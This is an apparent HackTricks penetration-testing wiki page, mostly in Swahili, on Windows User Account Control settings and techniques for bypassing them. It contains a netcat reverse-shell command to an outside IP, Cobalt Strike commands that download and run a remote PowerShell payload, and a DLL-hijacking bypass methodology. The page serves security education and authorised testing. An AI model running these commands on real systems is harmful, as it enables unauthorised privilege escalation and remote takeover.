# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kuonyeshwa kwa idhini kwa shughuli za juu**. Programu zina viwango tofauti vya `integrity`, na programu yenye **kiwango cha juu** inaweza kufanya kazi ambazo **zinaweza kuhatarisha mfumo**. Wakati UAC imewezeshwa, programu na kazi kila wakati **zinafanya kazi chini ya muktadha wa usalama wa akaunti isiyo ya msimamizi** isipokuwa msimamizi aidhinishe waziwazi programu/hizi kazi kuwa na ufikiaji wa kiwango cha msimamizi kwenye mfumo ili kuendesha. Ni kipengele cha urahisi kinacholinda wasimamizi kutokana na mabadiliko yasiyokusudiwa lakini hakichukuliwi kama mpaka wa usalama.

Kwa maelezo zaidi kuhusu viwango vya integrity:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wakati UAC ipo, mtumiaji wa msimamizi anapewa tokeni 2: ufunguo wa mtumiaji wa kawaida, ili kufanya vitendo vya kawaida kama kiwango cha kawaida, na moja yenye ruhusa za msimamizi.

Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) inajadili jinsi UAC inavyofanya kazi kwa undani mkubwa na inajumuisha mchakato wa kuingia, uzoefu wa mtumiaji, na usanifu wa UAC. Wasimamizi wanaweza kutumia sera za usalama kuunda jinsi UAC inavyofanya kazi maalum kwa shirika lao katika ngazi ya ndani (wakati wa kutumia secpol.msc), au kuundwa na kusukumwa kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Mipangilio mbalimbali inajadiliwa kwa undani [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Group Policy ambayo inaweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo zaidi:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

Baadhi ya programu zina **autoelevated automatically** ikiwa **mtumiaji ni** sehemu ya **kikundi cha wasimamizi**. Binaries hizi zina ndani ya _**Manifests**_ chaguo la _**autoElevate**_ lenye thamani _**True**_. Binary inapaswa kuwa **imeandikwa saini na Microsoft** pia.

Mchakato mwingi wa auto-elevate unatoa **ufanisi kupitia vitu vya COM au seva za RPC**, ambazo zinaweza kuitwa kutoka kwa michakato inayofanya kazi na integrity ya kati (ruhusa za mtumiaji wa kawaida). Kumbuka kwamba COM (Component Object Model) na RPC (Remote Procedure Call) ni mbinu ambazo programu za Windows hutumia kuwasiliana na kutekeleza kazi kati ya michakato tofauti. Kwa mfano, **`IFileOperation COM object`** imeundwa kushughulikia operesheni za faili (kunakili, kufuta, kuhamasisha) na inaweza kuongeza ruhusa kiotomatiki bila kuonyeshwa.

Kumbuka kwamba baadhi ya ukaguzi unaweza kufanywa, kama kuangalia ikiwa mchakato ulifanywa kutoka kwenye **System32 directory**, ambayo inaweza kupuuziliwa mbali kwa mfano **kuingiza ndani ya explorer.exe** au executable nyingine iliyoko System32.

Njia nyingine ya kupita ukaguzi hizi ni **kubadilisha PEB**. Kila mchakato katika Windows una Block ya Mazingira ya Mchakato (PEB), ambayo inajumuisha data muhimu kuhusu mchakato, kama vile njia yake ya executable. Kwa kubadilisha PEB, washambuliaji wanaweza kudanganya (spoof) eneo la mchakato wao mbaya, na kuifanya ionekane inafanya kazi kutoka kwenye directory iliyoaminika (kama system32). Taarifa hii iliyodanganywa inadanganya kitu cha COM kujiinua kiotomatiki bila kumwambia mtumiaji.

Kisha, ili **kupita** **UAC** (kuinua kutoka **kiwango** cha kati **hadi cha juu**) baadhi ya washambuliaji hutumia aina hii ya binaries ili **kutekeleza msimbo wowote** kwa sababu itatekelezwa kutoka kwenye **mchakato wa kiwango cha juu**.

Unaweza **kuangalia** _**Manifest**_ ya binary ukitumia zana _**sigcheck.exe**_ kutoka Sysinternals. (`sigcheck.exe -m <file>`) Na unaweza **kuona** **kiwango cha integrity** cha michakato ukitumia _Process Explorer_ au _Process Monitor_ (ya Sysinternals).

### Check UAC

Ili kuthibitisha ikiwa UAC imewezeshwa fanya:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Ikiwa ni **`1`** basi UAC ime **wezeshwa**, ikiwa ni **`0`** au haipo, basi UAC ni **isiyo active**.

Kisha, angalia **ni kiwango gani** kimewekwa:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Ikiwa **`0`** basi, UAC haitatoa ujumbe (kama **imezimwa**)
- Ikiwa **`1`** msimamizi **anaulizwa jina la mtumiaji na nenosiri** ili kutekeleza faili ya binary kwa haki za juu (katika Desktop Salama)
- Ikiwa **`2`** (**Daima niarifu**) UAC daima itauliza uthibitisho kwa msimamizi anapojaribu kutekeleza kitu chenye mamlaka ya juu (katika Desktop Salama)
- Ikiwa **`3`** kama `1` lakini si lazima katika Desktop Salama
- Ikiwa **`4`** kama `2` lakini si lazima katika Desktop Salama
- ikiwa **`5`**(**kawaida**) itauliza msimamizi kuthibitisha kuendesha binaries zisizo za Windows kwa mamlaka ya juu

Kisha, unapaswa kuangalia thamani ya **`LocalAccountTokenFilterPolicy`**\
Ikiwa thamani ni **`0`**, basi, mtumiaji tu wa **RID 500** (**Msimamizi wa ndani**) anaweza kufanya **kazi za usimamizi bila UAC**, na ikiwa ni `1`, **akaunti zote ndani ya kundi la "Administrators"** zinaweza kufanya hivyo.

Na, hatimaye angalia thamani ya funguo **`FilterAdministratorToken`**\
Ikiwa **`0`**(kawaida), akaunti ya **Msimamizi wa ndani inaweza** kufanya kazi za usimamizi wa mbali na ikiwa **`1`** akaunti ya msimamizi wa ndani **haiwezi** kufanya kazi za usimamizi wa mbali, isipokuwa `LocalAccountTokenFilterPolicy` imewekwa kuwa `1`.

#### Muhtasari

- Ikiwa `EnableLUA=0` au **haipo**, **hakuna UAC kwa mtu yeyote**
- Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=1` , Hakuna UAC kwa mtu yeyote**
- Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=0`, Hakuna UAC kwa RID 500 (Msimamizi wa ndani)**
- Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=1`, UAC kwa kila mtu**

Taarifa hii yote inaweza kukusanywa kwa kutumia moduli ya **metasploit**: `post/windows/gather/win_privs`

Unaweza pia kuangalia makundi ya mtumiaji wako na kupata kiwango cha uaminifu:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Kumbuka kwamba ikiwa una ufikiaji wa picha kwa mwathirika, UAC bypass ni rahisi kwani unaweza kubofya tu "Ndio" wakati ujumbe wa UAC unapoonekana

UAC bypass inahitajika katika hali zifuatazo: **UAC imewashwa, mchakato wako unafanya kazi katika muktadha wa uaminifu wa kati, na mtumiaji wako ni sehemu ya kundi la wasimamizi**.

Ni muhimu kutaja kwamba ni **vigumu zaidi kupita UAC ikiwa iko katika kiwango cha juu zaidi cha usalama (Daima) kuliko ikiwa iko katika viwango vingine vyovyote (Kawaida).**

### UAC disabled

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **kutekeleza shell ya kinyume na ruhusa za admin** (kiwango cha juu cha uaminifu) ukitumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sana** Msingi UAC "bypass" (ufikiaji wa mfumo wa faili kamili)

Ikiwa una shell na mtumiaji ambaye yuko ndani ya kundi la Wasimamizi unaweza **kuunganisha C$** iliyoshirikiwa kupitia SMB (mfumo wa faili) ndani ya diski mpya na utakuwa na **ufikiaji wa kila kitu ndani ya mfumo wa faili** (hata folda ya nyumbani ya Msimamizi).

> [!WARNING]
> **Inaonekana kama hila hii haitumiki tena**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Mbinu za Cobalt Strike zitaweza kufanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu cha usalama.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia zina moduli kadhaa za **kuepuka** **UAC**.

### KRBUACBypass

Hati na zana katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)ambayo ni **mkusanyiko** wa exploits kadhaa za UAC bypass. Kumbuka kwamba utahitaji **kukusanya UACME ukitumia visual studio au msbuild**. Kukusanya kutaunda executable kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unahitaji.**\
Unapaswa **kuwa makini** kwa sababu baadhi ya kuepuka kutatoa **maonyo kwa programu nyingine** ambazo zita **onya** **mtumiaji** kwamba kuna kitu kinatokea.

UACME ina **toleo la kujenga ambalo kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayohusisha toleo lako:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ inapaswa kufanya kazi)

### UAC Bypass with GUI

If you have access to a **GUI you can just accept the UAC prompt** when you get it, you don't really need a bypass it. So, getting access to a GUI will allow you to bypass the UAC.

Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.

### Noisy brute-force UAC bypass

If you don't care about being noisy you could always **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) that **ask to elevate permissions until the user does accepts it**.

### Your own bypass - Basic UAC bypass methodology

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### Another UAC bypass technique

Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).

{{#include ../../banners/hacktricks-training.md}}
